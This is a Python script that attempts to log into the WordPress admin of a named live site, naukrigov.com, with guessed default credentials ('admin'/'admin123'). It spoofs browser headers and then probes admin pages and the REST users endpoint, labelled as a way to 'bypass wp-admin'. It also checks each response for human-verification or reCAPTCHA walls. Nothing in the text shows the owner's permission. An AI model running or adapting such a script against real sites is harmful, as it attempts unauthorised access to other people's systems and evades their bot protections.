#!/usr/bin/env python3
"""naukrigov: after login POST (307), try direct paths with the session cookies"""
import urllib.request, urllib.parse, re, http.cookiejar

UA = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Cache-Control": "no-cache",
    "Pragma": "no-cache",
    "Upgrade-Insecure-Requests": "1",
}
BASE = "https://naukrigov.com"
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

def fetch(url, data=None, timeout=20, referer=None):
    h = dict(UA)
    if referer: h["Referer"] = referer
    if data is not None:
        h["Content-Type"] = "application/x-www-form-urlencoded"
        h["Origin"] = BASE
    try:
        req = urllib.request.Request(url, data=data.encode() if data else None, headers=h)
        r = op.open(req, timeout=timeout)
        return r.status, r.geturl(), r.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, url, e.read().decode("utf-8", "ignore")
    except Exception as ex:
        return 0, url, str(ex)

# 1. GET login
code, final, body = fetch(BASE + "/wp-login.php")
print("1) GET login:", code, "cookies:", [c.name for c in cj])

# 2. POST login
data = urllib.parse.urlencode({
    "log": "admin", "pwd": "admin123", "wp-submit": "Log In",
    "redirect_to": BASE + "/wp-admin/", "testcookie": "1"})
code, final, resp = fetch(BASE + "/wp-login.php", data=data, referer=BASE + "/wp-login.php")
print("2) POST:", code, final, "cookies:", [c.name for c in cj])

# 3. try upgrade.php directly (bypass wp-admin)
for path in ["/wp-admin/upgrade.php", "/wp-admin/upgrade.php?step=1&backto=%2Fwp-admin%2F",
             "/wp-admin/index.php", "/wp-admin/profile.php", "/wp-admin/edit.php",
             "/wp-json/wp/v2/users/me"]:
    code, final, body = fetch(BASE + path, referer=BASE + "/wp-login.php")
    title = re.search(r"<title>([^<]*)</title>", body).group(1) if "<title>" in body else ""
    is_cf = "recaptcha.cloud" in final or "Human verification" in body
    auth = "wordpress_logged_in" in str([c.name for c in cj])
    print("%s: %s %s size=%d cf=%s title=%s" % (path, code, final[:60], len(body), is_cf, title[:40]))
    if not is_cf and code == 200 and len(body) > 2000:
        print("  >>> REAL PAGE, auth_cookies:", [c.name for c in cj])
